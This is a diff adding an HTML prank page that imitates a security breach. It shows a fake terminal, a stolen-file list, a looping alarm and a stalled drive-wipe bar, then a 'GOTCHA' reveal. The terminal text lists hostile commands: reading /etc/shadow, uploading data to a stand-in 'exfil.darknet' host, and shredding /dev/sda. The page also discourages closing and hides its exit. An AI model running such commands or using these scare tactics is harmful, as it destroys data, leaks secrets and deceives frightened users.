@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Security Alert</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        /* ═══════════════════════════════════════════════════
+           RESET & BASE
+           ═══════════════════════════════════════════════════ */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+            font-family: 'Roboto Mono', 'Share Tech Mono', 'Courier New', monospace;
+            color: #00FF00;
+            cursor: default;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           SCANLINE OVERLAY (CRT EFFECT)
+           ═══════════════════════════════════════════════════ */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03) 0px,
+                rgba(0, 255, 0, 0.03) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.6) 100%);
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           GLITCH / FLICKER EFFECT
+           ═══════════════════════════════════════════════════ */
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            3% { opacity: 0.85; }
+            6% { opacity: 1; }
+            7.5% { opacity: 0.7; }
+            9% { opacity: 1; }
+            20% { opacity: 1; }
+            21% { opacity: 0.6; }
+            22% { opacity: 1; }
+            50% { opacity: 1; }
+            51% { opacity: 0.4; }
+            52% { opacity: 1; }
+            80% { opacity: 1; }
+            81% { opacity: 0.8; }
+            82% { opacity: 1; }
+        }
+
+        .flicker-layer {
+            animation: flicker 6s infinite;
+        }
+
+        @keyframes glitch-shift {
+            0%, 100% { transform: translate(0); filter: none; }
+            10% { transform: translate(-2px, 1px); filter: hue-rotate(90deg); }
+            20% { transform: translate(2px, -1px); filter: hue-rotate(-90deg); }
+            30% { transform: translate(0); filter: none; }
+        }
+
+        .glitch-active {
+            animation: glitch-shift 0.15s ease-in-out;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           MAIN CONTAINER
+           ═══════════════════════════════════════════════════ */
+        #main-container {
+            width: 100%;
+            height: 100%;
+            overflow-y: auto;
+            padding: 10px 16px 60px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           RED ALERT BANNER
+           ═══════════════════════════════════════════════════ */
+        @keyframes blink-red {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0.2; }
+        }
+
+        @keyframes pulse-bg {
+            0%, 100% { background-color: rgba(255, 0, 0, 0.15); }
+            50% { background-color: rgba(255, 0, 0, 0.3); }
+        }
+
+        .alert-banner {
+            border: 2px solid #FF0000;
+            padding: 14px 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            animation: pulse-bg 1.5s ease-in-out infinite;
+            position: relative;
+        }
+
+        .alert-banner::before,
+        .alert-banner::after {
+            content: '⚠';
+            font-size: 1.2em;
+            margin: 0 8px;
+        }
+
+        .alert-banner h1 {
+            display: inline;
+            color: #FF0000;
+            font-size: clamp(0.7rem, 2.8vw, 1.3rem);
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            animation: blink-red 1s step-end infinite;
+            text-shadow: 0 0 10px rgba(255,0,0,0.8), 0 0 20px rgba(255,0,0,0.4);
+        }
+
+        /* ═══════════════════════════════════════════════════
+           SYSTEM INFO HEADER
+           ═══════════════════════════════════════════════════ */
+        .sys-info {
+            font-size: clamp(0.55rem, 1.8vw, 0.75rem);
+            color: #00cc00;
+            margin-bottom: 18px;
+            line-height: 1.6;
+            border-bottom: 1px solid #003300;
+            padding-bottom: 12px;
+        }
+
+        .sys-info .label {
+            color: #009900;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           TERMINAL / CLI SECTION
+           ═══════════════════════════════════════════════════ */
+        .terminal-window {
+            background: rgba(0, 20, 0, 0.6);
+            border: 1px solid #004400;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 20px;
+            min-height: 200px;
+            max-height: 300px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .terminal-window::-webkit-scrollbar {
+            width: 6px;
+        }
+        .terminal-window::-webkit-scrollbar-track {
+            background: #001100;
+        }
+        .terminal-window::-webkit-scrollbar-thumb {
+            background: #004400;
+            border-radius: 3px;
+        }
+
+        .terminal-title {
+            font-size: clamp(0.55rem, 1.6vw, 0.7rem);
+            color: #007700;
+            margin-bottom: 10px;
+            padding-bottom: 6px;
+            border-bottom: 1px dashed #003300;
+        }
+
+        .cli-line {
+            font-size: clamp(0.6rem, 2vw, 0.8rem);
+            line-height: 1.7;
+            opacity: 0;
+            animation: fadeInLine 0.3s forwards;
+            white-space: nowrap;
+        }
+
+        .cli-line .prompt {
+            color: #009900;
+        }
+
+        .cli-line .cmd {
+            color: #00FF00;
+        }
+
+        .cli-line .status-ok {
+            color: #00cc00;
+        }
+
+        .cli-line .status-warn {
+            color: #FFaa00;
+        }
+
+        .cli-line .status-danger {
+            color: #FF0000;
+        }
+
+        @keyframes fadeInLine {
+            to { opacity: 1; }
+        }
+
+        .cursor-blink {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background: #00FF00;
+            animation: blink-cursor 0.7s step-end infinite;
+            vertical-align: text-bottom;
+            margin-left: 2px;
+        }
+
+        @keyframes blink-cursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* ═══════════════════════════════════════════════════
+           PROGRESS BAR
+           ═══════════════════════════════════════════════════ */
+        .progress-section {
+            margin: 24px 0;
+        }
+
+        .progress-label {
+            font-size: clamp(0.6rem, 2vw, 0.8rem);
+            color: #FF0000;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .progress-label .percent {
+            font-size: clamp(1rem, 4vw, 1.6rem);
+            font-weight: 700;
+            color: #FF0000;
+            text-shadow: 0 0 12px rgba(255,0,0,0.6);
+            animation: blink-red 2s step-end infinite;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 28px;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            width: 99%;
+            height: 100%;
+            background: linear-gradient(90deg, #cc0000, #ff0000, #ff3333);
+            border-radius: 3px;
+            position: relative;
+            animation: progress-pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes progress-pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.75; }
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(
+                -45deg,
+                transparent,
+                transparent 8px,
+                rgba(0,0,0,0.15) 8px,
+                rgba(0,0,0,0.15) 16px
+            );
+            animation: stripe-move 1s linear infinite;
+        }
+
+        @keyframes stripe-move {
+            0% { background-position: 0 0; }
+            100% { background-position: 32px 0; }
+        }
+
+        /* ═══════════════════════════════════════════════════
+           WARNING BLOCK
+           ═══════════════════════════════════════════════════ */
+        .warning-block {
+            background: rgba(255, 0, 0, 0.08);
+            border: 1px solid #FF0000;
+            border-left: 4px solid #FF0000;
+            padding: 14px 16px;
+            margin: 20px 0;
+            color: #FF0000;
+            font-size: clamp(0.65rem, 2.2vw, 0.85rem);
+            line-height: 1.5;
+            text-shadow: 0 0 8px rgba(255,0,0,0.3);
+            animation: pulse-bg-warn 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-bg-warn {
+            0%, 100% { background-color: rgba(255,0,0,0.08); }
+            50% { background-color: rgba(255,0,0,0.15); }
+        }
+
+        .warning-block .warning-icon {
+            font-size: 1.2em;
+            margin-right: 6px;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           FILE LIST SECTION
+           ═══════════════════════════════════════════════════ */
+        .file-section {
+            margin: 20px 0;
+            border: 1px solid #003300;
+            padding: 10px;
+            background: rgba(0,10,0,0.4);
+            border-radius: 4px;
+        }
+
+        .file-section-title {
+            font-size: clamp(0.55rem, 1.8vw, 0.72rem);
+            color: #FF4444;
+            margin-bottom: 8px;
+            padding-bottom: 6px;
+            border-bottom: 1px dashed #330000;
+        }
+
+        .file-item {
+            font-size: clamp(0.5rem, 1.6vw, 0.68rem);
+            color: #00aa00;
+            line-height: 1.8;
+            opacity: 0;
+            animation: fadeInLine 0.4s forwards;
+        }
+
+        .file-item .file-status {
+            color: #FF0000;
+            margin-left: 6px;
+            font-size: 0.9em;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           ABORT BUTTON (HIDDEN)
+           ═══════════════════════════════════════════════════ */
+        .abort-btn {
+            display: block;
+            margin: 40px auto 20px;
+            padding: 6px 16px;
+            background: #111;
+            color: #222;
+            border: 1px solid #1a1a1a;
+            font-family: inherit;
+            font-size: 0.55rem;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+        }
+
+        .abort-btn:hover {
+            color: #444;
+            border-color: #333;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           GOTCHA OVERLAY
+           ═══════════════════════════════════════════════════ */
+        .gotcha-overlay {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 5000;
+            padding: 20px;
+        }
+
+        .gotcha-overlay.active {
+            display: flex;
+        }
+
+        @keyframes gotcha-zoom {
+            0% { transform: scale(0) rotate(-15deg); opacity: 0; }
+            60% { transform: scale(1.15) rotate(3deg); opacity: 1; }
+            80% { transform: scale(0.95) rotate(-1deg); }
+            100% { transform: scale(1) rotate(0); }
+        }
+
+        @keyframes rainbow {
+            0% { color: #FF0000; text-shadow: 0 0 30px #FF0000, 0 0 60px #FF0000; }
+            16% { color: #FF8800; text-shadow: 0 0 30px #FF8800, 0 0 60px #FF8800; }
+            33% { color: #FFFF00; text-shadow: 0 0 30px #FFFF00, 0 0 60px #FFFF00; }
+            50% { color: #00FF00; text-shadow: 0 0 30px #00FF00, 0 0 60px #00FF00; }
+            66% { color: #0088FF; text-shadow: 0 0 30px #0088FF, 0 0 60px #0088FF; }
+            83% { color: #8800FF; text-shadow: 0 0 30px #8800FF, 0 0 60px #8800FF; }
+            100% { color: #FF0000; text-shadow: 0 0 30px #FF0000, 0 0 60px #FF0000; }
+        }
+
+        .gotcha-title {
+            font-family: 'Roboto Mono', monospace;
+            font-size: clamp(2rem, 10vw, 5rem);
+            font-weight: 700;
+            text-align: center;
+            animation: gotcha-zoom 0.6s ease-out forwards, rainbow 2s linear infinite;
+            letter-spacing: 4px;
+        }
+
+        .gotcha-sub {
+            font-size: clamp(1rem, 4vw, 2rem);
+            color: #00FF00;
+            margin-top: 20px;
+            text-align: center;
+            animation: gotcha-zoom 0.6s 0.3s ease-out forwards;
+            opacity: 0;
+            text-shadow: 0 0 15px rgba(0,255,0,0.5);
+        }
+
+        .gotcha-emoji {
+            font-size: clamp(3rem, 12vw, 6rem);
+            margin-top: 20px;
+            animation: gotcha-zoom 0.6s 0.5s ease-out forwards;
+            opacity: 0;
+        }
+
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            top: -10px;
+            z-index: 5001;
+            pointer-events: none;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           AUDIO CONTEXT BEEP (VISUAL CUE)
+           ═══════════════════════════════════════════════════ */
+        @keyframes border-flash {
+            0%, 100% { border-color: #FF0000; }
+            50% { border-color: #FF4444; }
+        }
+
+        /* ═══════════════════════════════════════════════════
+           SPLASH / GATE SCREEN
+           ═══════════════════════════════════════════════════ */
+        .splash-overlay {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+            cursor: pointer;
+        }
+
+        .splash-overlay.hidden {
+            display: none;
+        }
+
+        .splash-icon {
+            font-size: clamp(4rem, 15vw, 8rem);
+            animation: blink-red 1s step-end infinite;
+        }
+
+        .splash-title {
+            color: #FF0000;
+            font-size: clamp(1.2rem, 4vw, 2rem);
+            font-weight: 700;
+            text-align: center;
+            margin-top: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px rgba(255,0,0,0.7), 0 0 30px rgba(255,0,0,0.4);
+            animation: blink-red 1.2s step-end infinite;
+        }
+
+        .splash-subtitle {
+            color: #00FF00;
+            font-size: clamp(0.7rem, 2.2vw, 1rem);
+            text-align: center;
+            margin-top: 16px;
+            opacity: 0.8;
+        }
+
+        .splash-tap {
+            color: #FF4444;
+            font-size: clamp(0.8rem, 2.5vw, 1.1rem);
+            margin-top: 40px;
+            padding: 12px 30px;
+            border: 2px solid #FF0000;
+            border-radius: 4px;
+            animation: pulse-bg 1.5s ease-in-out infinite, blink-red 2s step-end infinite;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .splash-fine {
+            color: #333;
+            font-size: 0.5rem;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        /* ═══════════════════════════════════════════════════
+           RESPONSIVE
+           ═══════════════════════════════════════════════════ */
+        @media (max-width: 480px) {
+            #main-container {
+                padding: 8px 10px 60px;
+            }
+            .terminal-window {
+                min-height: 160px;
+                max-height: 220px;
+                padding: 8px;
+            }
+            .progress-track {
+                height: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- SPLASH GATE (unlocks audio on click) -->
+    <div class="splash-overlay" id="splash-overlay">
+        <div class="splash-icon">🛡️</div>
+        <div class="splash-title">⚠ Critical Threat Detected</div>
+        <div class="splash-subtitle">Your device security has been compromised.<br>Immediate action required.</div>
+        <div class="splash-tap">▶ TAP TO VIEW DETAILS</div>
+        <div class="splash-fine">Security scan ID: 0x4F2A · Ref #SEC-78391</div>
+    </div>
+
+    <!-- MAIN PRANK CONTENT -->
+    <div id="main-container" class="flicker-layer" style="display:none;">
+
+        <!-- RED ALERT BANNER -->
+        <div class="alert-banner" id="alert-banner">
+            <h1>SYSTEM COMPROMISED: UNAUTHORIZED ACCESS DETECTED</h1>
+        </div>
+
+        <!-- SYSTEM INFO -->
+        <div class="sys-info" id="sys-info">
+            <div><span class="label">TARGET:</span> <span id="target-ip">192.168.1.███</span> &nbsp;|&nbsp; <span class="label">SESSION:</span> <span id="session-id">0xDEADBEEF</span></div>
+            <div><span class="label">PROTOCOL:</span> SSH-2.0-EXPLOIT &nbsp;|&nbsp; <span class="label">STATUS:</span> <span style="color:#FF0000;">ACTIVE BREACH</span></div>
+            <div><span class="label">TIME ELAPSED:</span> <span id="elapsed-time">00:00:00</span></div>
+        </div>
+
+        <!-- TERMINAL CLI -->
+        <div class="terminal-window" id="terminal">
+            <div class="terminal-title">┌── root@compromised-system:~# ──────────────────────────┐</div>
+            <div id="cli-output"></div>
+        </div>
+
+        <!-- FILES BEING "ACCESSED" -->
+        <div class="file-section" id="file-section" style="display:none;">
+            <div class="file-section-title">📁 FILES ACCESSED — /home/user/</div>
+            <div id="file-list"></div>
+        </div>
+
+        <!-- PROGRESS BAR -->
+        <div class="progress-section" id="progress-section" style="display:none;">
+            <div class="progress-label">
+                <span>▶ HARD DRIVE WIPE IN PROGRESS...</span>
+                <span class="percent" id="wipe-percent">0%</span>
+            </div>
+            <div class="progress-track">
+                <div class="progress-fill" id="progress-fill" style="width:0%"></div>
+            </div>
+        </div>
+
+        <!-- WARNING BLOCK -->
+        <div class="warning-block" id="warning-block" style="display:none;">
+            <span class="warning-icon">🔴</span>
+            <strong>WARNING:</strong> Do not close this window. Hard drive wipe in progress. All local data, contacts, photos, and messages will be permanently erased. Recovery will NOT be possible.
+        </div>
+
+        <!-- HIDDEN ABORT BUTTON -->
+        <button class="abort-btn" id="abort-btn" style="display:none;" onclick="revealPrank()">Click to Abort</button>
+    </div>
+
+    <!-- GOTCHA OVERLAY -->
+    <div class="gotcha-overlay" id="gotcha-overlay">
+        <div class="gotcha-title">GOTCHA!</div>
+        <div class="gotcha-sub">YOU'VE BEEN PRANKED 🎉</div>
+        <div class="gotcha-emoji">😂</div>
+    </div>
+
+    <script>
+        // ═══════════════════════════════════════════════
+        // CONFIGURATION
+        // ═══════════════════════════════════════════════
+        const CLI_COMMANDS = [
+            { prompt: 'root@sys:~#', cmd: 'nmap -sS -O 192.168.1.0/24', delay: 250 },
+            { status: 'Scanning network... 254 hosts found', type: 'ok', delay: 350 },
+            { prompt: 'root@sys:~#', cmd: 'ssh -p 4444 root@target', delay: 200 },
+            { status: '[+] Connection established — bypassing authentication...', type: 'warn', delay: 400 },
+            { status: '[+] ROOT ACCESS GRANTED', type: 'danger', delay: 300 },
+            { prompt: 'root@target:~#', cmd: 'cat /etc/shadow', delay: 200 },
+            { status: '[✓] Password hashes extracted — 12 accounts', type: 'danger', delay: 350 },
+            { prompt: 'root@target:~#', cmd: 'iptables -F && iptables -X', delay: 200 },
+            { status: 'Bypassing firewall... [████████████████████] DONE', type: 'ok', delay: 500 },
+            { prompt: 'root@target:~#', cmd: 'tar -czf /tmp/data.tar.gz /home/user/*', delay: 150 },
+            { status: 'Compressing user data... 2.4 GB packaged', type: 'warn', delay: 400 },
+            { prompt: 'root@target:~#', cmd: 'exfiltrate --contacts --photos --messages', delay: 200 },
+            { status: 'Downloading contacts... 847 entries', type: 'danger', delay: 450 },
+            { status: 'Downloading photos... 3,291 files', type: 'danger', delay: 400 },
+            { status: 'Downloading messages... 14,088 threads', type: 'danger', delay: 400 },
+            { prompt: 'root@target:~#', cmd: 'gpg --encrypt --recipient attacker@dark data.tar.gz', delay: 200 },
+            { status: 'Encrypting local storage... AES-256-CBC applied', type: 'warn', delay: 500 },
+            { prompt: 'root@target:~#', cmd: 'curl -X POST https://exfil.darknet/upload -F file=@data.tar.gz.gpg', delay: 150 },
+            { status: '[✓] Upload complete — 2.4 GB transferred to remote server', type: 'danger', delay: 500 },
+            { prompt: 'root@target:~#', cmd: 'shred -vfz -n 5 /dev/sda', delay: 250 },
+            { status: '[!] INITIATING HARD DRIVE WIPE — THIS IS IRREVERSIBLE', type: 'danger', delay: 400 },
+        ];
+
+        const FILE_LIST = [
+            { name: '/Documents/passwords.txt', status: 'COPIED' },
+            { name: '/Documents/bank_statements_2025.pdf', status: 'COPIED' },
+            { name: '/Photos/personal/', status: 'COPIED (3,291 files)' },
+            { name: '/WhatsApp/databases/msgstore.db', status: 'COPIED' },
+            { name: '/Downloads/tax_returns.xlsx', status: 'COPIED' },
+            { name: '/.ssh/id_rsa', status: 'COPIED' },
+            { name: '/Contacts/contacts.vcf', status: 'COPIED' },
+            { name: '/Notes/private_diary.txt', status: 'COPIED' },
+        ];
+
+        // ═══════════════════════════════════════════════
+        // STATE
+        // ═══════════════════════════════════════════════
+        let currentLine = 0;
+        let elapsedSeconds = 0;
+        let pranked = false;
+
+        // ═══════════════════════════════════════════════
+        // ELAPSED TIMER
+        // ═══════════════════════════════════════════════
+        function updateTimer() {
+            elapsedSeconds++;
+            const h = String(Math.floor(elapsedSeconds / 3600)).padStart(2, '0');
+            const m = String(Math.floor((elapsedSeconds % 3600) / 60)).padStart(2, '0');
+            const s = String(elapsedSeconds % 60).padStart(2, '0');
+            document.getElementById('elapsed-time').textContent = `${h}:${m}:${s}`;
+        }
+        setInterval(updateTimer, 1000);
+
+        // ═══════════════════════════════════════════════
+        // GLITCH EFFECT
+        // ═══════════════════════════════════════════════
+        function triggerGlitch() {
+            if (pranked) return;
+            const container = document.getElementById('main-container');
+            container.classList.add('glitch-active');
+            setTimeout(() => container.classList.remove('glitch-active'), 150);
+        }
+
+        // Random glitch every 3-8 seconds
+        function scheduleGlitch() {
+            const delay = 3000 + Math.random() * 5000;
+            setTimeout(() => {
+                triggerGlitch();
+                scheduleGlitch();
+            }, delay);
+        }
+        scheduleGlitch();
+
+        // ═══════════════════════════════════════════════
+        // SHARED AUDIO CONTEXT
+        // ═══════════════════════════════════════════════
+        let audioCtx = null;
+        function getAudioCtx() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            return audioCtx;
+        }
+
+        // ═══════════════════════════════════════════════
+        // BEEP SOUND (Web Audio API)
+        // ═══════════════════════════════════════════════
+        function beep(freq = 800, duration = 80) {
+            try {
+                const ctx = getAudioCtx();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'square';
+                osc.frequency.value = freq;
+                gain.gain.value = 0.35;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + duration / 1000);
+            } catch (e) {}
+        }
+
+        // ═══════════════════════════════════════════════
+        // SOS ALARM SOUND (Morse: ··· −−− ···)
+        // ═══════════════════════════════════════════════
+        let sosInterval = null;
+        let sosTimeout = null;
+
+        function playSosPattern() {
+            try {
+                const ctx = getAudioCtx();
+                const now = ctx.currentTime;
+                const freq = 880;        // alarm tone frequency
+                const dotLen = 0.1;      // short beep duration
+                const dashLen = 0.3;     // long beep duration
+                const gap = 0.08;        // gap between elements
+                const letterGap = 0.2;   // gap between letters
+
+                // SOS pattern: ··· −−− ···
+                const pattern = [];
+                // S: 3 dots
+                let t = now;
+                for (let i = 0; i < 3; i++) {
+                    pattern.push({ start: t, dur: dotLen });
+                    t += dotLen + gap;
+                }
+                t += letterGap - gap;
+                // O: 3 dashes
+                for (let i = 0; i < 3; i++) {
+                    pattern.push({ start: t, dur: dashLen });
+                    t += dashLen + gap;
+                }
+                t += letterGap - gap;
+                // S: 3 dots
+                for (let i = 0; i < 3; i++) {
+                    pattern.push({ start: t, dur: dotLen });
+                    t += dotLen + gap;
+                }
+
+                pattern.forEach(note => {
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    osc.type = 'square';
+                    osc.frequency.value = freq;
+                    gain.gain.value = 0.4;
+                    // Slight envelope to avoid clicks
+                    gain.gain.setValueAtTime(0, note.start);
+                    gain.gain.linearRampToValueAtTime(0.4, note.start + 0.01);
+                    gain.gain.setValueAtTime(0.4, note.start + note.dur - 0.01);
+                    gain.gain.linearRampToValueAtTime(0, note.start + note.dur);
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+                    osc.start(note.start);
+                    osc.stop(note.start + note.dur);
+                });
+            } catch (e) {}
+        }
+
+        function startSosAlarm() {
+            if (pranked) return;
+            playSosPattern();
+            // Each full SOS pattern takes ~2.5s, loop every 3s
+            sosInterval = setInterval(() => {
+                if (pranked) {
+                    stopSosAlarm();
+                    return;
+                }
+                playSosPattern();
+            }, 3000);
+        }
+
+        function stopSosAlarm() {
+            if (sosInterval) {
+                clearInterval(sosInterval);
+                sosInterval = null;
+            }
+        }
+
+        // ═══════════════════════════════════════════════
+        // CLI LINE RENDERER
+        // ═══════════════════════════════════════════════
+        function addCliLine(data) {
+            const terminal = document.getElementById('cli-output');
+            const line = document.createElement('div');
+            line.className = 'cli-line';
+
+            if (data.prompt) {
+                line.innerHTML = `<span class="prompt">${data.prompt}</span> <span class="cmd">${data.cmd}</span>`;
+                beep(600, 40);
+            } else if (data.status) {
+                const typeClass = data.type === 'danger' ? 'status-danger' :
+                                  data.type === 'warn' ? 'status-warn' : 'status-ok';
+                line.innerHTML = `<span class="${typeClass}">${data.status}</span>`;
+                if (data.type === 'danger') beep(300, 100);
+            }
+
+            terminal.appendChild(line);
+
+            // Auto-scroll
+            const terminalWindow = document.getElementById('terminal');
+            terminalWindow.scrollTop = terminalWindow.scrollHeight;
+        }
+
+        // ═══════════════════════════════════════════════
+        // FILE LIST RENDERER
+        // ═══════════════════════════════════════════════
+        function showFileList() {
+            const section = document.getElementById('file-section');
+            const list = document.getElementById('file-list');
+            section.style.display = 'block';
+
+            FILE_LIST.forEach((file, i) => {
+                setTimeout(() => {
+                    const item = document.createElement('div');
+                    item.className = 'file-item';
+                    item.style.animationDelay = `${i * 0.1}s`;
+                    item.innerHTML = `📄 ${file.name} <span class="file-status">[${file.status}]</span>`;
+                    list.appendChild(item);
+                    beep(400 + i * 30, 30);
+                }, i * 150);
+            });
+        }
+
+        // ═══════════════════════════════════════════════
+        // PROGRESS BAR (STICKS AT 99%)
+        // ═══════════════════════════════════════════════
+        function animateProgressBar() {
+            const section = document.getElementById('progress-section');
+            const fill = document.getElementById('progress-fill');
+            const percentEl = document.getElementById('wipe-percent');
+            section.style.display = 'block';
+
+            let percent = 0;
+            const interval = setInterval(() => {
+                if (percent >= 99) {
+                    clearInterval(interval);
+                    // Show warning and abort button
+                    document.getElementById('warning-block').style.display = 'block';
+                    document.getElementById('abort-btn').style.display = 'block';
+                    // Add blinking cursor to terminal
+                    const cursor = document.createElement('span');
+                    cursor.className = 'cursor-blink';
+                    document.getElementById('cli-output').appendChild(cursor);
+                    return;
+                }
+                // Fast at first, slow dramatically near 99
+                if (percent < 70) {
+                    percent += Math.random() * 8 + 2;
+                } else if (percent < 90) {
+                    percent += Math.random() * 3 + 0.5;
+                } else {
+                    percent += Math.random() * 1.5 + 0.1;
+                }
+                percent = Math.min(percent, 99);
+                const displayPercent = Math.floor(percent);
+                fill.style.width = displayPercent + '%';
+                percentEl.textContent = displayPercent + '%';
+                if (displayPercent > 90) beep(200, 60);
+            }, 80);
+        }
+
+        // ═══════════════════════════════════════════════
+        // SEQUENCE RUNNER
+        // ═══════════════════════════════════════════════
+        function runSequence() {
+            if (currentLine >= CLI_COMMANDS.length) {
+                // After all CLI lines, show files then progress
+                setTimeout(showFileList, 500);
+                setTimeout(animateProgressBar, FILE_LIST.length * 150 + 600);
+                return;
+            }
+
+            const data = CLI_COMMANDS[currentLine];
+            addCliLine(data);
+            currentLine++;
+
+            setTimeout(runSequence, data.delay || 800);
+        }
+
+        // ═══════════════════════════════════════════════
+        // SPLASH GATE — waits for user tap to unlock audio
+        // ═══════════════════════════════════════════════
+        document.getElementById('splash-overlay').addEventListener('click', function() {
+            // Hide splash, show main content
+            this.classList.add('hidden');
+            document.getElementById('main-container').style.display = '';
+
+            // Force-create and resume AudioContext (unlocked by user gesture)
+            const ctx = getAudioCtx();
+            if (ctx.state === 'suspended') ctx.resume();
+
+            // Start everything
+            setTimeout(() => {
+                runSequence();
+                startSosAlarm();
+            }, 200);
+        });
+
+        // ═══════════════════════════════════════════════
+        // CONFETTI GENERATOR
+        // ═══════════════════════════════════════════════
+        function spawnConfetti() {
+            const colors = ['#FF0000', '#00FF00', '#0088FF', '#FFFF00', '#FF00FF', '#00FFFF', '#FF8800'];
+            for (let i = 0; i < 80; i++) {
+                const el = document.createElement('div');
+                el.className = 'confetti';
+                el.style.left = Math.random() * 100 + 'vw';
+                el.style.width = (6 + Math.random() * 10) + 'px';
+                el.style.height = (6 + Math.random() * 10) + 'px';
+                el.style.background = colors[Math.floor(Math.random() * colors.length)];
+                el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                el.style.animation = `confetti-fall ${2 + Math.random() * 3}s linear ${Math.random() * 2}s forwards`;
+                document.body.appendChild(el);
+            }
+        }
+
+        // ═══════════════════════════════════════════════
+        // REVEAL PRANK
+        // ═══════════════════════════════════════════════
+        function revealPrank() {
+            pranked = true;
+            stopSosAlarm();
+            const overlay = document.getElementById('gotcha-overlay');
+            overlay.classList.add('active');
+            spawnConfetti();
+
+            // Party beeps
+            try {
+                const ctx = getAudioCtx();
+                const notes = [523, 659, 784, 1047];
+                notes.forEach((freq, i) => {
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    osc.type = 'square';
+                    osc.frequency.value = freq;
+                    gain.gain.value = 0.3;
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+                    osc.start(ctx.currentTime + i * 0.15);
+                    osc.stop(ctx.currentTime + i * 0.15 + 0.12);
+                });
+            } catch (e) {}
+        }
+
+        // ═══════════════════════════════════════════════
+        // PREVENT CLOSING (adds to believability)
+        // ═══════════════════════════════════════════════
+        window.addEventListener('beforeunload', function(e) {
+            if (!pranked) {
+                e.preventDefault();
+                e.returnValue = 'WARNING: Closing this window will cause irreversible data loss!';
+            }
+        });
+
+        // Disable right-click for authenticity
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
